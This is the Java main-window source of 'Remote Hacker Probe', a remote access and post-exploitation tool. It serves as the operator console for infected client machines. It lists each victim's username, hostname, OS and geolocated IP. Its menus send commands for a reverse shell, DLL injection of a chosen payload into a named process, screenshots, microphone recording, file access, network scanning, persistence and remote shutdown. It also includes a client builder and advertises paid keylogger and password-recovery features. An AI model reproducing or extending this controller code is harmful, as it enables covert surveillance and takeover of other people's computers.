package rhp;

import java.awt.EventQueue;

import javax.swing.JFrame;

import com.github.weisj.darklaf.LafManager;
import com.github.weisj.darklaf.settings.ThemeSettings;
import com.github.weisj.darklaf.theme.DarculaTheme;
import com.github.weisj.darklaf.theme.IntelliJTheme;
import com.github.weisj.darklaf.theme.SolarizedDarkTheme;
import com.github.weisj.darklaf.theme.SolarizedLightTheme;
import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;

import javax.swing.JLabel;
import java.awt.Font;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetAddress;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.concurrent.TimeUnit;

import javax.swing.JToggleButton;
import javax.swing.UIManager;
import javax.swing.filechooser.FileNameExtensionFilter;
import javax.swing.DefaultListModel;
import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JDialog;
import javax.swing.JFileChooser;

import java.awt.Window.Type;
import javax.swing.JList;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import javax.swing.JTextArea;

import java.awt.Color;
import java.awt.Component;
import java.awt.Cursor;
import javax.swing.JTable;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.tools.DocumentationTool.Location;
import com.maxmind.geoip2.record.*;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;

public class MainWindow {

	public JFrame frmRemoteHackerProbe;
	public static DefaultTableModel model = new DefaultTableModel() {

	    @Override
	    public boolean isCellEditable(int row, int column) {
	       return false;
	    }
	};
	static JTextArea LogArea = new JTextArea();
	public static JTable table;
	public static JLabel onlinelabel;
	static JLabel userlbl = new JLabel("User : ");

	/**
	 * Launch the application.
	 */
	
	public static Double GetLatitude(int CLIENT_ID)
	{
		String dbLocation = "GeoLite2-City.mmdb";
		File database = new File(dbLocation);
		String ip = Server.WANIP.get(CLIENT_ID);	
	    DatabaseReader dbReader;
	    File database1 = new File(dbLocation);
	    DatabaseReader reader;
		try {
			reader = new DatabaseReader.Builder(database1).build();
			InetAddress ipAddress = InetAddress.getByName(ip);
		    CityResponse response;
			try {
				response = reader.city(ipAddress);
				com.maxmind.geoip2.record.Location location = response.getLocation();
			    return location.getLatitude();
			} catch (GeoIp2Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}
	
	public static Double GetLongitude(int CLIENT_ID)
	{
		String dbLocation = "GeoLite2-City.mmdb";
		File database = new File(dbLocation);
		String ip = Server.WANIP.get(CLIENT_ID);
	    DatabaseReader dbReader;
	    File database1 = new File(dbLocation);
	    DatabaseReader reader;
		try {
			reader = new DatabaseReader.Builder(database1).build();
			InetAddress ipAddress = InetAddress.getByName(ip);
		    CityResponse response;
			try {
				response = reader.city(ipAddress);
				com.maxmind.geoip2.record.Location location = response.getLocation();
			    return location.getLongitude();
			} catch (GeoIp2Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}
	
	
	public static void HaltAllSystems()
	{
		if(FileManager.FileList != null){
			FileManager.FileList.setEnabled(false); // Disable The File Manager
		}
		
		if(Shell.ShellOutput != null);
		{
			Shell.ShellOutput.setEnabled(false); // Disable Shell
		}
		table.getSelectionModel().clearSelection();
		table.setEnabled(false); // Disable the Main Table too!
	}
	
	public static void EnableAllSystems()
	{
		if(FileManager.FileList != null)
		{
			FileManager.FileList.setEnabled(true); // Enable The File Manager
		}
		
		if(Shell.ShellOutput != null)
		{
			Shell.ShellOutput.setEnabled(true); // Enable Shell
		}
		table.setEnabled(true); // Enable the Main Table too!
	}
	public static void Log(String text)
	{
		String timeStamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
		LogArea.append("["+ Settings.userSetting("username") + "@" +timeStamp+"] " + text + "\n");
	}
	
	public static void UpdateOnlineLabel()
	{
		String label = "Online : " + String.valueOf( Server.Clients.size() );
		onlinelabel.setText(label);
	}
	
	public static void SaveTheme(String Theme)
	{
		try {
			Settings.changeProperty("rhp.ini", "theme", Theme.replaceAll("\\s+", ""));
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public static void UpdateTheme()
	{
		String themeName = Settings.returnSetting("theme");
		if(themeName.equals("Dark")) {
			LafManager.install(new DarculaTheme());
		} else if(themeName.equals("Light")) {
			LafManager.install(new IntelliJTheme());
		} else if(themeName.equals("SolarizedDark")) {
			LafManager.install(new SolarizedDarkTheme());
		} else if(themeName.equals("SolarizedLight")) {
			LafManager.install(new SolarizedLightTheme());
		} else {
			LafManager.install(new IntelliJTheme());
		}
		
		ThemeSettings settings = ThemeSettings.getInstance();

		settings.refresh();
	}
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					
					UpdateTheme();
				
					UIManager.put("OptionPane.messageFont", new Font("Calibri", Font.PLAIN, 12));
					UIManager.put("OptionPane.buttonFont", new Font("Calibri", Font.PLAIN, 12));
					
					String usrlbltxt = Settings.userSetting("username");
					if(usrlbltxt.equals("FILE_NOT_FOUND"))
					{
						Register dialog = new Register();
						dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
						dialog.setVisible(true);
					} else {
						MainWindow window = new MainWindow();
						window.frmRemoteHackerProbe.setVisible(true);
						userlbl.setText("User : " + Settings.userSetting("username"));
					}
					
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	
	
	public MainWindow() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	
	private void initialize() {
		// Start the server
		Server srv = new Server();
		srv.server_host = Settings.returnSetting("host");
		srv.server_port = Integer.parseInt(Settings.returnSetting("port"));
		srv.tcpserver.start();
		Log("Remote Hacker Probe Started.");
		
		frmRemoteHackerProbe = new JFrame();
		frmRemoteHackerProbe.setTitle("Remote Hacker Probe Open Source V.1");
		frmRemoteHackerProbe.setBounds(100, 100, 786, 458);
		frmRemoteHackerProbe.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		
		JLabel heading = new JLabel("Remote Hacker Probe");
		heading.setFont(new Font("Calibri", Font.PLAIN, 15));
	
		
		userlbl.setForeground(new Color(65, 105, 225));
		userlbl.setFont(new Font("Calibri", Font.BOLD, 14));
		
		
		
		onlinelabel = new JLabel("Online");
		onlinelabel.setToolTipText("Online Clients");
		onlinelabel.setFont(new Font("Calibri", Font.PLAIN, 12));
		LogArea.setEditable(false);
		
		LogArea.setCursor(Cursor.getPredefinedCursor(Cursor.TEXT_CURSOR));
		LogArea.setToolTipText("Logs");
		LogArea.setFont(new Font("Consolas", Font.BOLD, 12));
		
		JScrollPane sp = new JScrollPane(LogArea);
		sp.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		sp.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
		
		JButton clearLogs = new JButton("Clear Logs");
		clearLogs.setToolTipText("Clear logs.");
		clearLogs.setFont(new Font("Calibri", Font.PLAIN, 12));
		clearLogs.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				int result = JOptionPane.showConfirmDialog(frmRemoteHackerProbe, "Are you sure you want to clear logs?",
				        "Clear Logs", JOptionPane.OK_CANCEL_OPTION);
				if(result == JOptionPane.YES_OPTION) {
					LogArea.setText("");
				}
			}
		});
		
		
		table = new JTable(model); 
		DefaultTableCellRenderer centerRenderer = new DefaultTableCellRenderer();
		centerRenderer.setHorizontalAlignment( JLabel.CENTER );
		table.setDefaultRenderer(String.class, centerRenderer);
		
		table.setToolTipText("List of Online Clients");
		model.addColumn("ID");
		model.addColumn("IP Address");
		model.addColumn("Port");
		 
		model.addColumn("Username");
		model.addColumn("Hostname");
		model.addColumn("OS");
		model.addColumn("Public IP");
		model.addColumn("Country");
		
		
		table.setFont(new Font("Consolas", Font.PLAIN, 12));
		//table.setBounds(10, 69, 614, 194);
		JScrollPane tablescroll = new JScrollPane(table);
		tablescroll.setToolTipText("Online Clients appear here");
		
	    JPopupMenu popupMenu = new JPopupMenu();
	    
	    JMenuItem shell = new JMenuItem(" Reverse Shell" , new ImageIcon("icons/9.png"));
	    shell.setFont(new Font("Calibri", Font.PLAIN, 13));
	    shell.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					Shell rshell = new Shell();
					int index = table.getSelectedRow();
					rshell.ShellAccessingClientId = index; 
					rshell.interact.setText("Reverse Shell for Client ID : " + String.valueOf(index) + " @ " + Server.UserPC.get(index) + " running " + Server.OperatingSystem.get(index));
					Log("Accessing Reverse Shell for Client ID : " + String.valueOf(rshell.ShellAccessingClientId));
					rshell.setVisible(true);	
				}
			}
	    });
	    
	    
	    JMenuItem execpayload = new JMenuItem(" Execute Payload" , new ImageIcon("icons/34.png"));
	    execpayload.setFont(new Font("Calibri", Font.PLAIN, 13));
	    execpayload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {	
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					JFileChooser filechooser = new JFileChooser();
					FileNameExtensionFilter filter = new FileNameExtensionFilter("DLL File","dll");
					filechooser.setFileFilter(filter);
					filechooser.showOpenDialog(frmRemoteHackerProbe);
					File file = filechooser.getSelectedFile();
					long filesize = file.length();
					String process_name = JOptionPane.showInputDialog("Enter Process Name to Inject into : ");
					if(process_name.length() > 0)
					{
						byte[] file_buffer = new byte[4096];
						Arrays.fill(file_buffer, (byte)0);
						int count = 0;
						DataOutputStream out = null;
						try {
							out = new DataOutputStream(Server.Clients.get(index).getOutputStream());
						} catch (IOException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}
						FileInputStream  in = null;
						try {
							in = new FileInputStream(file);
		
						} catch (FileNotFoundException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						
						// Send DLL Injection Trigger
						Server.SendData(Server.Clients.get(index), "fdll");
						Server.SendData(Server.Clients.get(index), "REMOTE_HACKER_PROBE:"+String.valueOf(filesize) + ":" + process_name);
						// Send the DLL!
						
						try {
							TimeUnit.SECONDS.sleep(1);
						} catch (InterruptedException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}
						
						try {
							while ((count = in.read(file_buffer)) > 0) {
							     out.write(file_buffer, 0, count);
							}
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				}
			}
		});
	    JMenuItem unis = new JMenuItem(" Kill Temporarily" , new ImageIcon("icons/51.png"));
	    unis.setFont(new Font("Calibri", Font.PLAIN, 13));
	    unis.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				int index = table.getSelectedRow(); 
				Server.SendData(Server.Clients.get(index), "kill");
				ServerThread s = new ServerThread(Server.Clients.get(index)); s.clear();
				Log("Connection Closed for Client ID : " + String.valueOf(index));
			}
				
		});
	    
	    JMenuItem ss = new JMenuItem(" Take Screenshot" , new ImageIcon("icons/44.png"));
	    ss.setFont(new Font("Calibri", Font.PLAIN, 13));
	    ss.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
	    			Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Server.SendData(Server.Clients.get(index), "screenshot");
					ServerThread.WaitForReply();
					Log("Taking Screenshot of Client ID : " + String.valueOf(index));
				}
				
			}
		});
	    
	    JMenuItem mic = new JMenuItem(" Record Mic" , new ImageIcon("icons/38.png"));
	    mic.setFont(new Font("Calibri", Font.PLAIN, 13));
	    mic.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
	    			Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					MicRecorder mc = new MicRecorder();
					MicRecorder.CLIENT_ID = index;
					mc.setVisible(true);
				}
			}
		});
	    
	    JMenuItem pinfo = new JMenuItem(" Process Information" , new ImageIcon("icons/9.png"));
	    pinfo.setFont(new Font("Calibri", Font.PLAIN, 13));
	    pinfo.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent arg0) {
	    		if(table.getSelectionModel().isSelectionEmpty()) {
	    			Log("No Client has been Selected.");
				} else {
					String process_name = JOptionPane.showInputDialog("Enter Process Name : ");
					int index = table.getSelectedRow(); 
					if(process_name.length() > 0)
					{
						Server.SendData(Server.Clients.get(index), "psinfo:"+process_name);
						ServerThread.WaitForReply();
						Log("Getting information for process '" + process_name + "' on Client ID : " + String.valueOf(index));
					}
					
				}
	    	}
	    });
	    
	    JMenuItem filemgr = new JMenuItem(" File Manager" , new ImageIcon("icons/26.png"));
	    filemgr.setFont(new Font("Calibri", Font.PLAIN, 13));
	    filemgr.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Log("Accessing File Manager for Client ID : " + String.valueOf(table.getSelectedRow()));
					// Get The Drives
					Server.SendData(Server.Clients.get(index), "drives");
					ServerThread.WaitForReply();
					FileManager dialog = new FileManager();
					dialog.CLIENT_ID = table.getSelectedRow(); 
					dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
					dialog.setVisible(true);
				}
			}
		});
	   
	    JMenuItem network_scanner = new JMenuItem(" Network Scanner" , new ImageIcon("icons/30.png"));
	    network_scanner.setFont(new Font("Calibri", Font.PLAIN, 13));
	    network_scanner.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					NetworkScanner ns = new NetworkScanner();
					ns.CLIENT_ID = table.getSelectedRow(); 
					ns.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
					
					ns.setVisible(true);
				}
				
			}
	    	
	    });
	    JMenuItem geolocate = new JMenuItem(" Geolocate" , new ImageIcon("icons/46.png"));
	    geolocate.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					Map m = new Map();
					m.CLIENT_ID = table.getSelectedRow(); 
					m.UpdateMapInfo();
					m.setVisible(true);
				}
			}
		});
	    geolocate.setFont(new Font("Calibri", Font.PLAIN, 13));
	    JMenuItem help = new JMenuItem(" Help" , new ImageIcon("icons/027-note.png"));
	    help.setFont(new Font("Calibri", Font.PLAIN, 13));
	    help.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JOptionPane.showMessageDialog(frmRemoteHackerProbe,
						"Remote Hacker Probe - Help"
						+ "\nRemote Hacker Probe is a Remote Access and Post Exploitation Software.\r\n"
						+ "\r\n"
						+ "Created By : QuantumCore"
						+ "\nFor more information visit : https://quantumcored.com/index.php/the-remote-hacker-probe/"
			);
			}
		});
	    
	    
	    JMenuItem shutdown = new JMenuItem(" Shut down" , new ImageIcon("icons/51.png"));
	    shutdown.setFont(new Font("Calibri", Font.PLAIN, 13));
	    shutdown.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Server.SendData(Server.Clients.get(index), "poweroff");
					ServerThread.WaitForReply();
					Log("Shutting Down Client ID : " + String.valueOf(index));
				}
			}
		});
	    

	    JMenuItem restart = new JMenuItem(" Restart" , new ImageIcon("icons/arrows.png"));
	    restart.setFont(new Font("Calibri", Font.PLAIN, 13));
	    restart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Server.SendData(Server.Clients.get(index), "restart");
					ServerThread.WaitForReply();	
					Log("Restarting Client ID : " + String.valueOf(index));
				}
			}
		});
	    
	    
	    JMenuItem persist = new JMenuItem(" Persist" , new ImageIcon("icons/47.png"));
	    persist.setFont(new Font("Calibri", Font.PLAIN, 13));
	    persist.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Persist ps = new Persist();
					ps.CLIENT_ID = index;
					ps.username = Server.UserPC.get(index).replace(" ", "").split("/")[0];
					ps.setVisible(true);
				}
			}
		});
	    
	    JMenuItem msgbox = new JMenuItem(" Message box" , new ImageIcon("icons/55.png"));
	    msgbox.setFont(new Font("Calibri", Font.PLAIN, 13));
	    msgbox.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					MsgBox dialog = new MsgBox();
					MsgBox.CLIENT_ID = table.getSelectedRow(); 
					dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
					dialog.setVisible(true);
				}
			}
		});
	    
	    JMenuItem openurl = new JMenuItem(" Open URL" , new ImageIcon("icons/7.png"));
	    openurl.setFont(new Font("Calibri", Font.PLAIN, 13));
	    openurl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					String url = JOptionPane.showInputDialog("Enter URL (http/https) :  ");
					if(url.startsWith("http"))
					{
						Server.SendData(Server.Clients.get(index), "openurl="+url);
						ServerThread.WaitForReply();
						Log("Opening url '" + url + "' on Client ID : " + String.valueOf(index));
					} else {
						JOptionPane.showMessageDialog(null, "URL must start with http/https.");
					}
				}
			}
		});
	    
	    
	    JMenuItem keylog = new JMenuItem(" Keylogger" , new ImageIcon("icons/58.png"));
	    keylog.setFont(new Font("Calibri", Font.PLAIN, 13));
	    keylog.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JOptionPane.showMessageDialog(null, "You discovered a Pro Feature! Upgrade now to Remote Hacker Probe Pro to get access to this feature.");
			}
		});
	    
	    JMenuItem taskmgr = new JMenuItem(" Task Manager" , new ImageIcon("icons/32.png"));
	    taskmgr.setFont(new Font("Calibri", Font.PLAIN, 13));
	    taskmgr.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JOptionPane.showMessageDialog(null, "You discovered a Pro Feature! Upgrade now to Remote Hacker Probe Pro to get access to this feature.");
				
			}
		});
	    
	    JMenuItem pwrecover = new JMenuItem(" Password Recovery" , new ImageIcon("icons/60.png"));
	    pwrecover.setFont(new Font("Calibri", Font.PLAIN, 13));
	    pwrecover.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JOptionPane.showMessageDialog(null, "You discovered a Pro Feature! Upgrade now to Remote Hacker Probe Pro to get access to this feature.");
			}
		});


	    
	    JMenu systemstuff = new JMenu(" System ");
	    systemstuff.setIcon(new ImageIcon("icons/032-profile.png"));
	    systemstuff.setFont(new Font("Calibri", Font.PLAIN, 13));
	    
		JMenu surveillance = new JMenu(" Surveillance ");
		surveillance.setFont(new Font("Calibri", Font.PLAIN, 13));
		surveillance.setIcon(new ImageIcon("icons/050-vision.png"));

		JMenu infogather = new JMenu(" Information Gathering ");
		infogather.setFont(new Font("Calibri", Font.PLAIN, 13));
		infogather.setIcon(new ImageIcon("icons/041-statistics.png"));
		
		JMenu pcpower = new JMenu(" Computer Power ");
		pcpower.setFont(new Font("Calibri", Font.PLAIN, 13));
		pcpower.setIcon(new ImageIcon("icons/031-power.png"));
		
		JMenu fun = new JMenu(" Miscellaneous ");
		fun.setFont(new Font("Calibri", Font.PLAIN, 13));
		fun.setIcon(new ImageIcon("icons/033-rating.png"));
		
		JMenu client = new JMenu(" Client ");
		client.setFont(new Font("Calibri", Font.PLAIN, 13));
		client.setIcon(new ImageIcon("icons/038-gear.png"));
		
		JMenu hlp = new JMenu("Help ");
		hlp.setFont(new Font("Calibri", Font.PLAIN, 13));
		hlp.setIcon(new ImageIcon("icons/012-favorite.png"));
		
		
		systemstuff.add(filemgr);
		systemstuff.add(shell);
		systemstuff.add(execpayload);
		systemstuff.add(taskmgr);

	    infogather.add(network_scanner);
	    infogather.add(geolocate);
	    infogather.add(pwrecover);
	    
	    surveillance.add(ss);
	    surveillance.add(mic);
	    surveillance.add(keylog);
	    

	    pcpower.add(shutdown);
	    pcpower.add(restart);
	    
	    client.add(unis);
	    client.add(persist);

	    
	    fun.add(msgbox);
	    fun.add(openurl);
	    
	    
	    popupMenu.add(systemstuff);
	    popupMenu.add(surveillance);
	    popupMenu.add(infogather);
	    popupMenu.add(pcpower);
	    popupMenu.add(fun);
	    popupMenu.add(client);
	    
	    hlp.add(help);
	    popupMenu.add(hlp);
	    
		
	    addPopup(table, popupMenu);
	    
	    JButton settingsButton = new JButton("Settings");
	    settingsButton.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent e) {
	    		Settings s = new Settings();
				s.setVisible(true);
	    	}
	    });
	    settingsButton.setFont(new Font("Calibri", Font.PLAIN, 12));
	    settingsButton.setToolTipText("Change / View RHP Server Settings");
	    
	    JButton exportLog = new JButton("Export Logs");
	    exportLog.setToolTipText("Export logs to a file.");
	    exportLog.setFont(new Font("Calibri", Font.PLAIN, 12));
	    exportLog.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent e) {
	    		JFileChooser fileChooser = new JFileChooser();
	    		if (fileChooser.showSaveDialog(frmRemoteHackerProbe) == JFileChooser.APPROVE_OPTION) {
	    		  File file = fileChooser.getSelectedFile();
	    		  FileWriter wt;
					try {
						wt = new FileWriter(file, true);
						wt.write(LogArea.getText());
						wt.close();
					} catch (IOException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					}
	    		}
	    	}
	    });
	    
	    JButton btnBuild = new JButton("Build");
	    btnBuild.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent e) {
	    		Builder b = new Builder(); 
	    		b.setVisible(true);
	    	}
	    });
	    btnBuild.setToolTipText("Build RHP Client");
	    btnBuild.setFont(new Font("Calibri", Font.PLAIN, 12));
	    
	    JButton btnNewButton = new JButton("Upgrade");
	    btnNewButton.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent e) {
	    		try {
	    	        String url = "https://quantumcored.com/index.php/product/remote-hacker-probe-pro/";
	    	        java.awt.Desktop.getDesktop().browse(java.net.URI.create(url));
	    	    } catch (java.io.IOException e1) {
	    	        System.out.println(e1.getMessage());
	    	    }
	    	}
	    });
	    btnNewButton.setFont(new Font("Calibri", Font.PLAIN, 12));
	    
	    
	   
	    
	    
	    GroupLayout groupLayout = new GroupLayout(frmRemoteHackerProbe.getContentPane());
	    groupLayout.setHorizontalGroup(
	    	groupLayout.createParallelGroup(Alignment.LEADING)
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addContainerGap()
	    			.addComponent(heading, GroupLayout.PREFERRED_SIZE, 207, GroupLayout.PREFERRED_SIZE)
	    			.addContainerGap(553, Short.MAX_VALUE))
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addGap(10)
	    			.addComponent(onlinelabel, GroupLayout.DEFAULT_SIZE, 250, Short.MAX_VALUE)
	    			.addGap(205)
	    			.addComponent(btnNewButton, GroupLayout.PREFERRED_SIZE, 101, GroupLayout.PREFERRED_SIZE)
	    			.addPreferredGap(ComponentPlacement.RELATED)
	    			.addComponent(btnBuild, GroupLayout.PREFERRED_SIZE, 89, GroupLayout.PREFERRED_SIZE)
	    			.addGap(10)
	    			.addComponent(settingsButton, GroupLayout.PREFERRED_SIZE, 89, GroupLayout.PREFERRED_SIZE)
	    			.addGap(10))
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addGap(10)
	    			.addComponent(tablescroll, GroupLayout.DEFAULT_SIZE, 750, Short.MAX_VALUE)
	    			.addGap(10))
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addContainerGap()
	    			.addComponent(userlbl, GroupLayout.PREFERRED_SIZE, 412, GroupLayout.PREFERRED_SIZE)
	    			.addPreferredGap(ComponentPlacement.RELATED, 117, Short.MAX_VALUE)
	    			.addComponent(exportLog, GroupLayout.PREFERRED_SIZE, 106, GroupLayout.PREFERRED_SIZE)
	    			.addPreferredGap(ComponentPlacement.UNRELATED)
	    			.addComponent(clearLogs, GroupLayout.PREFERRED_SIZE, 105, GroupLayout.PREFERRED_SIZE)
	    			.addContainerGap())
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addGap(10)
	    			.addComponent(sp, GroupLayout.DEFAULT_SIZE, 750, Short.MAX_VALUE)
	    			.addGap(10))
	    );
	    groupLayout.setVerticalGroup(
	    	groupLayout.createParallelGroup(Alignment.LEADING)
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addGap(11)
	    			.addComponent(heading, GroupLayout.PREFERRED_SIZE, 21, GroupLayout.PREFERRED_SIZE)
	    			.addGap(7)
	    			.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
	    				.addGroup(groupLayout.createSequentialGroup()
	    					.addGap(4)
	    					.addComponent(onlinelabel, GroupLayout.PREFERRED_SIZE, 14, GroupLayout.PREFERRED_SIZE))
	    				.addComponent(btnBuild)
	    				.addComponent(settingsButton)
	    				.addComponent(btnNewButton))
	    			.addGap(7)
	    			.addComponent(tablescroll, GroupLayout.DEFAULT_SIZE, 233, Short.MAX_VALUE)
	    			.addGap(11)
	    			.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
	    				.addComponent(clearLogs)
	    				.addComponent(exportLog)
	    				.addComponent(userlbl))
	    			.addGap(11)
	    			.addComponent(sp, GroupLayout.DEFAULT_SIZE, 61, Short.MAX_VALUE)
	    			.addGap(11))
	    );
	    frmRemoteHackerProbe.getContentPane().setLayout(groupLayout);
	    
	}
	
	public static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}
			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}
			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
}
